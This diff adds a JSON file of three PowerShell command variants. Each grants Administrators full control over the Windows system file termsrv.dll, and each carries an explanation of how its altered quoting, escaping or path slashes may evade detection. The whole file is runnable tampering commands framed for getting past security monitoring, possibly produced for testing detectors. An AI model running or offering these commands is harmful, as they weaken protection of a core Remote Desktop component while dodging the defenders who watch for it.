@@ -1,0 +1,14 @@
+[
+  {
+    "output": "powershell.exe -Command \"& { $termsrvDll = 'C:\\Windows\\System32\\termsrv.dll'; $ACL = Get-Acl $termsrvDll; $permission = 'Administrators','FullControl','Allow'; $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule $permission; $ACL.SetAccessRule($accessRule); Set-Acl -Path $termsrvDll -AclObject $ACL }\"",
+    "explanation": "This command uses a slightly modified syntax with explicit -Command parameter and single quotes for string literals, which is equivalent to the original but may bypass detection by altering the command parsing structure."
+  },
+  {
+    "output": "powershell.exe & { $termsrvDll = 'C:\\\\Windows\\\\System32\\\\termsrv.dll'; $ACL = Get-Acl $termsrvDll; $permission = 'Administrators','FullControl','Allow'; $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule $permission; $ACL.SetAccessRule($accessRule); Set-Acl -Path $termsrvDll -AclObject $ACL }",
+    "explanation": "This command omits the outer quotes and uses double backslashes for path escaping, which is a safe mutation that changes the visual structure without altering the behavior."
+  },
+  {
+    "output": "powershell.exe -Command \"& { $termsrvDll = 'C:/Windows/System32/termsrv.dll'; $ACL = Get-Acl $termsrvDll; $permission = 'Administrators','FullControl','Allow'; $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule $permission; $ACL.SetAccessRule($accessRule); Set-Acl -Path $termsrvDll -AclObject $ACL }\"",
+    "explanation": "This command uses forward slashes in the file path, which is a valid Windows path representation and may evade detection by changing the path format."
+  }
+]
